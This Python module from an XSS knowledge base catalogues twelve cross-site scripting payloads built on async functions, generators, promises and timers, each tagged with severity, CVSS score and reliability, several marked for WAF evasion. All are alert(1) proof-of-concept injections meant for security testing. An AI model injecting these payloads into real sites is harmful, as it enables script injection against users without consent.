#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

JavaScript Async Payloads
"""

from ..models import PayloadEntry


ASYNC_GENERATOR_PAYLOADS = {
    "async_1": PayloadEntry(
        payload="<script>async function x(){alert(1)}x()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Async function XSS",
        tags=["async", "function"],
        reliability="high",
    ),
    "async_2": PayloadEntry(
        payload="<script>(async()=>alert(1))()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Async arrow XSS",
        tags=["async", "arrow"],
        reliability="high",
    ),
    "async_3": PayloadEntry(
        payload="<script>function*g(){yield alert(1)}g().next()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Generator function XSS",
        tags=["generator", "function"],
        reliability="high",
    ),
    "async_4": PayloadEntry(
        payload="<script>async function*ag(){yield alert(1)}ag().next()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Async generator XSS",
        tags=["async", "generator"],
        reliability="high",
    ),
    "async_5": PayloadEntry(
        payload="<script>Promise.resolve().then(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Promise then XSS",
        tags=["promise", "then"],
        waf_evasion=True,
        reliability="high",
    ),
    "async_6": PayloadEntry(
        payload="<script>queueMicrotask(()=>alert(1))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="queueMicrotask XSS",
        tags=["microtask", "queue"],
        waf_evasion=True,
        reliability="high",
    ),
}

TIMER_PAYLOADS = {
    "timer_setTimeout": PayloadEntry(
        payload="<script>setTimeout('alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="setTimeout string",
        tags=["timer", "setTimeout"],
        reliability="high",
    ),
    "timer_setTimeout_fn": PayloadEntry(
        payload="<script>setTimeout(alert,0,1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="setTimeout function with arg",
        tags=["timer", "setTimeout", "args"],
        waf_evasion=True,
        reliability="high",
    ),
    "timer_setInterval": PayloadEntry(
        payload="<script>setInterval('alert(1)',99999)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="setInterval string",
        tags=["timer", "setInterval"],
        reliability="high",
    ),
    "timer_setImmediate": PayloadEntry(
        payload="<script>setImmediate&&setImmediate(alert,1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="setImmediate (IE/Node)",
        tags=["timer", "setImmediate"],
        browser_support=["ie"],
        reliability="low",
    ),
    "timer_requestAnimationFrame": PayloadEntry(
        payload="<script>requestAnimationFrame(()=>alert(1))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="requestAnimationFrame",
        tags=["timer", "requestAnimationFrame"],
        waf_evasion=True,
        reliability="high",
    ),
    "timer_requestIdleCallback": PayloadEntry(
        payload="<script>requestIdleCallback(()=>alert(1))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="requestIdleCallback",
        tags=["timer", "requestIdleCallback"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
JS_ASYNC_DATABASE = {
    **ASYNC_GENERATOR_PAYLOADS,
    **TIMER_PAYLOADS,
}
JS_ASYNC_TOTAL = len(JS_ASYNC_DATABASE)
